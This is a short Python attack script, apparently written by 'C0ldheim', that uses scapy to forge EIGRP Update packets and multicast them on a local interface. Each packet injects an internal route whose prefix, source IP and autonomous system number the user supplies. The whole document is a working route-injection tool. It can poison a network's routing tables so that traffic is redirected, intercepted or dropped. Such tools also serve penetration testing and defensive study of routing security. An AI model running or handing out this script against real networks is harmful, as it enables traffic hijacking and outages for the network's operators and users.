#!/usr/bin/env python3

#by C0ldheim


from scapy.all import *
from scapy.contrib.eigrp import *
from scapy.layers.l2 import *
import argparse

L2Multicast = "01:00:5E:00:00:0A"
EIGRPMulticast = "224.0.0.10"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str, dest="interface", required=True)
    parser.add_argument("--asn", type=int, dest="asn", required=True)
    parser.add_argument("--src", type=str, dest="source_ip", required=True)
    parser.add_argument("--dst", type=str, dest="destination_ip", required=True)
    parser.add_argument("--prefix", type=int, dest="prefix", required=True)
    
    args = parser.parse_args()

    return args


args = get_arguments()


def inject(interface, asn, source_ip, destination_ip, prefix):
    frame = Ether(dst=L2Multicast)
    ip = IP(src=args.source_ip, dst=EIGRPMulticast)
    eigrp = EIGRP(opcode=1, asn=args.asn, seq=0, ack=0, tlvlist=[EIGRPIntRoute(dst=args.destination_ip, prefixlen=args.prefix)])
    crafted = frame/ip/eigrp
    print("Start sending internal routes")
    sendp(crafted, iface=args.interface, loop=0, verbose=1)
    

inject(args.interface, args.asn, args.source_ip, args.destination_ip, args.prefix)
